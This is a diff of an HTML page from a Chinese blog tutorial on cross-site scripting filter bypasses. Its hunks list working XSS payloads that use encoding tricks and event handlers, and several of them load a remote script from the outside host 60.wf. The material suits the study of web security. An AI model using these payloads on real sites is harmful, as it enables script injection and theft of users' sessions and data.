@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="c1y2m3’blog">
 <meta property="og:description" content="最近一直偏向这方面的挖掘,也遇到了很多有趣的情况,故总 结一下一些自己的思路。 静下心来,边写边学吧 ~ 跨站脚本攻击 (Cross Site Scripting) 俗称:XSS ,利用网站本身设计不严谨,导致执行用户提交的恶意javascript脚本,对网站自身造成危害,XSS漏洞是web渗透中最常见而又最灵活的一个漏洞。 0x01   XSS分类 #原理很重要, 一定要认真看。XSS大致分为:">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-19T04:09:19.000Z">
+<meta property="og:updated_time" content="2018-11-22T03:04:04.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈跨站脚本绕过和防御">
 <meta name="twitter:description" content="最近一直偏向这方面的挖掘,也遇到了很多有趣的情况,故总 结一下一些自己的思路。 静下心来,边写边学吧 ~ 跨站脚本攻击 (Cross Site Scripting) 俗称:XSS ,利用网站本身设计不严谨,导致执行用户提交的恶意javascript脚本,对网站自身造成危害,XSS漏洞是web渗透中最常见而又最灵活的一个漏洞。 0x01   XSS分类 #原理很重要, 一定要认真看。XSS大致分为:">
@@ -154,14 +154,15 @@
 <p>##没有做如何过滤的情况下:</p>
 <p><code>&lt;sCRiPt/SrC=//60.wf/Sohr&gt;   大小写 比较常用</code></p>
 <h2 id="如果过滤-lt-script-gt-的前提下"><a href="#如果过滤-lt-script-gt-的前提下" class="headerlink" title="如果过滤&lt;script&gt;的前提下:"></a>如果过滤<code>&lt;script&gt;</code>的前提下:</h2><p><code>&lt;img src=x onerror=s=createElement(‘script’);body.appendChild(s);s.src=‘https://60.wf/Sohr’;&gt;</code></p>
-<p><code>&lt;svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</span><br></pre></td></tr></table></figure>
 <p><code>&lt;iframe/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
 <p>默些网站只是过滤了敏感标签,可以根据正则匹配去拼接绕过。</p>
-<h2 id="如果过滤script情况下"><a href="#如果过滤script情况下" class="headerlink" title="如果过滤script情况下 "></a>如果过滤<code>script</code>情况下 </h2><p>data协议:<br><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;</code></p>
+<h2 id="如果过滤script情况下"><a href="#如果过滤script情况下" class="headerlink" title="如果过滤script情况下 "></a>如果过滤<code>script</code>情况下 </h2><p>data协议:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
 <p><code>&lt;iframe/src=“data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==“&gt;</code></p>
 <h2 id="如果输出在-lt-script-gt-标签下"><a href="#如果输出在-lt-script-gt-标签下" class="headerlink" title="如果输出在&lt;script&gt;标签下 :"></a>如果输出在<code>&lt;script&gt;</code>标签下 :</h2><p><code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</code></p>
 <p><code>document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,47,47,54,48,46,119,102,47,83,111,104,114,39,62,60,92,47,115,99,114,105,112,116,62))</code></p>
-<p><code>var s=document.createElement(“script”);s.src=“//60.wf/Sohr”;document.head.appendChild(s);</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(“script”);s.src=“//60.wf/Sohr”;document.head.appendChild(s);</span><br></pre></td></tr></table></figure>
 <h2 id="关于javascript-x16进制编码"><a href="#关于javascript-x16进制编码" class="headerlink" title="关于javascript x16进制编码:"></a>关于javascript x16进制编码:</h2><p><code>javascript:document.write(“&lt;script src=‘//60.wf/Sohr’&gt;&lt;/script&gt;”);</code></p>
 <p>编码为:</p>
 <p><code>java\x73\x63\x72\x69\x70\x74\x3a\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x22\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x27\x2f\x2f\x36\x30\x2e\x77\x66\x2f\x53\x6f\x68\x72\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x29\x3b\x20;</code></p>
